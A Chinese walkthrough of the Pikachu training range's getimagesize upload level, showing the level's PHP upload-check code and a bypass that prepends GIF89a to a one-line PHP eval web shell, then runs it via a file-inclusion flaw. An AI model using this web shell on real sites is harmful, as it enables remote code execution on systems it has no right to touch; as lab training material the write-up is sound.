# getimagesize

# 一、代码审计

该关卡的代码如下

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "clientcheck.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}
$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR . 'header.php';
include_once $PIKA_ROOT_DIR.'inc/uploadfunction.php';

$html='';
if(isset($_POST['submit'])){
    $type=array('jpg','jpeg','png');//指定类型
    $mime=array('image/jpg','image/jpeg','image/png');
    $save_path='uploads'.date('/Y/m/d/');//根据当天日期生成一个文件夹
    $upload=upload('uploadfile','512000',$type,$mime,$save_path);//调用函数
    if($upload['return']){
        $html.="<p class='notice'>文件上传成功</p><p class='notice'>文件保存的路径为：{$upload['save_path']}</p>";
    }else{
        $html.="<p class=notice>{$upload['error']}</p>";

    }
}


?>





<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="upload.php">unsafe upfileupload</a>
                </li>
                <li class="active">getimagesize()</li>
            </ul><!-- /.breadcrumb -->
            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="getimagesize了解一下">
                点一下提示~
            </a>

        </div>
        <div class="page-content">
            <div id="usu_main">
                <p class="title">这里只允许上传图片，不要乱搞！</p>
                <form class="upload" method="post" enctype="multipart/form-data"  action="">
                    <input class="uploadfile" type="file"  name="uploadfile" /><br />
                    <input class="sub" type="submit" name="submit" value="开始上传" />
                </form>
                <?php
                echo $html;//输出了路径，暴露了
                ?>
            </div>


        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->






<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```

通过观察源码可以得到该关卡检查文件后缀，检查MIME类型，检查文件内容

***

# 二、通关教程

在文件开头添加GIF89a绕过文件内容检查，将文件名修改为图片格式后再上传，再利用文件包含漏洞解析该图片

```
GIF89a
<?php eval($_POST['x']);?>
```

![image-20230308143421295](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Unsafe file upload\images\image-20230308143421295.png)